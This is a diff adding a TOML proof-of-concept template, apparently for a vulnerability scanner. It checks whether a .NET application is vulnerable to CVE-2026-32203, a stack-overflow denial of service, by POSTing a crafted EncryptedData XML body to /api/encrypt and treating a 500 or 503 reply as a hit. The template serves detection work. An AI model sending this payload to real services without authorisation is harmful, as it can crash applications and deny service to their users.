@@ -1,0 +1,35 @@
+[info]
+author = "ave"
+description = "验证目标.NET应用是否受CVE-2026-32203栈缓冲区溢出拒绝服务漏洞影响，通过发送特制XML数据触发EncryptedXml类资源耗尽"
+id = "POC-AVE-2026-0692"
+name = "CVE-2026-32203 PoC"
+severity = "high"
+tags = ["ave-2026-0692"]
+vuln_id = [
+    "CVE-2026-32203",
+    "AVE-2026-0692",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/api/encrypt"
+protocol = "http"
+
+[poc.requests.body]
+content = "<EncryptedData><CipherData><CipherValue>A</CipherValue></CipherData></EncryptedData>"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/xml"
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [
+    500,
+    503,
+]
+type = "status"
